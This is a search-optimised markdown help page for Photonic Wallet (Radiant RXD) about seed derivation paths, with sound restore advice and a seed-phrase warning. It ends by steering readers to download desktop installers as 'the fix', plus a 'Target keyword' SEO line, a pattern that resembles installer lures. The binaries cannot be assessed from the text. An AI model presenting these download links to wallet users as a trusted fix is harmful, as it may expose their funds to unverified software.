<div align="center">

<img src="https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.png" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Radiant (RXD) derivation paths explained

[![Website](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-website-photonicwallet-org.svg)](https://photonicwallet.org) [![Release](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-release-v3-0-4.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-docs-guides.svg)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** A derivation path tells a wallet which family of keys to build from your seed; different wallets may use different paths.

---

## You'll see this if

- Same seed, different balance in two wallets
- Addresses do not match an old wallet
- Restore shows zero

## Why it happens

Each wallet picks a path (a coin type number). If two wallets disagree, the same words create different addresses. More background lives in our guide on [seed phrase not accepted by photonic](photonic-wallet-seed-phrase-not-accepted.md) and on the [restore guide](https://photonicwallet.org/guides/restore-wallet).

## Fix it step by step

1. Note which wallet originally created the seed.
2. Restore into Photonic and check the first receiving address.
3. Compare it with an address from your old wallet history.
4. If they differ, ask the original wallet's documentation which path it used.

## If that didn't work

Treat path details as guidance; confirm with the wallet that generated the seed before moving funds. The [Photonic FAQ](https://photonicwallet.org/faq) covers related cases, and [Move Photonic Wallet to a new computer](move-photonic-wallet-to-new-computer.md) may match your situation.

## Prevention

When you create a new wallet, record the app name and version next to your paper backup.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Can a wrong path lose coins?</b></summary>

No. It only shows a different set of addresses; the original ones are untouched.

</details>

<details>
<summary><b>Which path does Photonic use?</b></summary>

Check the in-app restore options of the current release.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-windows.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-macos.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-linux.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Seed phrase not accepted by Photonic](photonic-wallet-seed-phrase-not-accepted.md) | Photonic Wallet guide |
| [Move Photonic Wallet to a new computer](move-photonic-wallet-to-new-computer.md) | Photonic Wallet guide |
| [Forgot your Photonic Wallet password](forgot-photonic-wallet-password.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: radiant wallet derivation path · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
